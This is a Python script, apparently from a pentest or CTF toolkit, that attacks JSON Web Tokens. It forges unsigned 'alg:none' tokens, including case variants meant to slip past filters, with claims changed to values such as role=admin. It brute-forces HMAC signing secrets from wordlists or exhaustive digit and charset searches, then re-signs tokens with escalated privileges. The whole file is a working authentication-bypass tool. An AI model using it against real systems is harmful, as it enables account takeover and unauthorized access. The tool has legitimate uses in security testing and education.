#!/usr/bin/env python3
"""Dependency-free JWT helper: decode, alg:none forge, HMAC crack, re-sign.

    python jwt_tool_lite.py decode <jwt>
    python jwt_tool_lite.py none  <jwt> --set partner=admin [--variant None] [--no-dot]
    python jwt_tool_lite.py crack <jwt> --digits 4
    python jwt_tool_lite.py crack <jwt> -w ../../wordlists/secrets/jwt-secrets.txt
    python jwt_tool_lite.py sign  <jwt> --secret 1234 --set role=admin [--alg HS256]
    python jwt_tool_lite.py new   --secret s3cr3t --set user=admin --alg HS256     (from scratch)

--set k=v types values (true/false/null/ints); --set-str k=v always string.
"""
import argparse
import base64
import hashlib
import hmac
import itertools
import json
import sys

ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def enc(obj):
    return b64e(json.dumps(obj, separators=(",", ":")).encode())


def parse(tok):
    parts = tok.strip().split(".")
    if len(parts) < 2:
        sys.exit("not a JWT")
    h = json.loads(b64d(parts[0]))
    p = json.loads(b64d(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return h, p, sig, parts


def typed(v):
    low = v.lower()
    if low == "true":
        return True
    if low == "false":
        return False
    if low == "null":
        return None
    try:
        return int(v)
    except ValueError:
        return v


def apply_sets(p, sets, sets_str):
    for kv in sets or []:
        k, v = kv.split("=", 1)
        p[k] = typed(v)
    for kv in sets_str or []:
        k, v = kv.split("=", 1)
        p[k] = v
    return p


def sign(h, p, secret, alg):
    h = dict(h, alg=alg)
    si = f"{enc(h)}.{enc(p)}"
    sig = hmac.new(secret.encode(), si.encode(), ALGS[alg]).digest()
    return f"{si}.{b64e(sig)}"


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("cmd", choices=["decode", "none", "crack", "sign", "new"])
    ap.add_argument("token", nargs="?")
    ap.add_argument("--set", action="append")
    ap.add_argument("--set-str", action="append")
    ap.add_argument("--secret")
    ap.add_argument("--alg", default="HS256")
    ap.add_argument("--variant", default="none", help="none|None|NONE|nOnE")
    ap.add_argument("--no-dot", action="store_true", help="omit trailing '.' for alg none")
    ap.add_argument("-w", "--wordlist")
    ap.add_argument("--digits", type=int, help="brute numeric secrets of this length (also tries shorter)")
    ap.add_argument("--charset", help="brute all strings over this charset up to --maxlen")
    ap.add_argument("--maxlen", type=int, default=4)
    a = ap.parse_args()

    if a.cmd == "new":
        print(sign({"typ": "JWT"}, apply_sets({}, a.set, a.set_str), a.secret or "", a.alg))
        return
    h, p, sig, parts = parse(a.token)
    if a.cmd == "decode":
        print("header :", json.dumps(h, indent=2))
        print("payload:", json.dumps(p, indent=2))
        print("sig    :", sig)
        for k in ("exp", "iat", "nbf"):
            if isinstance(p.get(k), int):
                import datetime
                print(f"{k}: {datetime.datetime.utcfromtimestamp(p[k])} UTC")
        return
    if a.cmd == "none":
        p = apply_sets(p, a.set, a.set_str)
        h = dict(h, alg=a.variant)
        out = f"{enc(h)}.{enc(p)}" + ("" if a.no_dot else ".")
        print(out)
        return
    if a.cmd == "sign":
        p = apply_sets(p, a.set, a.set_str)
        print(sign(h, p, a.secret, a.alg if a.alg else h.get("alg", "HS256")))
        return
    if a.cmd == "crack":
        alg = h.get("alg", "HS256")
        if alg not in ALGS:
            sys.exit(f"alg {alg} is not HMAC; cannot crack offline")
        si = f"{parts[0]}.{parts[1]}".encode()
        target = b64d(parts[2])
        fn = ALGS[alg]

        def cands():
            if a.wordlist:
                for l in open(a.wordlist, encoding="utf-8", errors="ignore"):
                    yield l.rstrip("\r\n")
            if a.digits:
                for n in range(1, a.digits + 1):
                    for t in itertools.product("0123456789", repeat=n):
                        yield "".join(t)
            if a.charset:
                for n in range(1, a.maxlen + 1):
                    for t in itertools.product(a.charset, repeat=n):
                        yield "".join(t)
        for i, c in enumerate(cands()):
            if hmac.compare_digest(hmac.new(c.encode(), si, fn).digest(), target):
                print(f"[+] secret found after {i + 1} tries: {c!r}")
                return
        print("[-] secret not found")
        sys.exit(1)


if __name__ == "__main__":
    main()
